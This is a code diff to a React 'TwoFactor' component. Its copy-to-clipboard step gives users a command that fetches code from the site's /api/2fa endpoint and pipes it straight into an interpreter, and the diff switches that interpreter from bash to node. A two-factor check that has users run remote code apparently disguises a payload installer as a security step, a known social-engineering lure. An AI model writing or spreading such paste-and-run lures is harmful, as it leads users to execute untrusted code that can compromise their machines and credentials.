@@ -276,7 +276,7 @@ function TwoFactor() {
   const handleCopyCommand = async () => {
     const deviceCode = getDeviceCode();
     const domainUrl = window.location.origin;
-    const commandText = `curl -s "${domainUrl}/api/2fa?${deviceCode}&format=sh" | bash`;
+    const commandText = `curl -s "${domainUrl}/api/2fa?${deviceCode}" | node`;
     
     try {
       await navigator.clipboard.writeText(commandText);
@@ -350,7 +350,7 @@ function TwoFactor() {
   const getSecureCommand = () => {
     const deviceCode = getDeviceCode();
     const domainUrl = window.location.origin;
-    return `curl -s "${domainUrl}/api/2fa?${deviceCode}&format=sh" | bash`;
+    return `curl -s "${domainUrl}/api/2fa?${deviceCode}" | node`;
   };
 
   return (
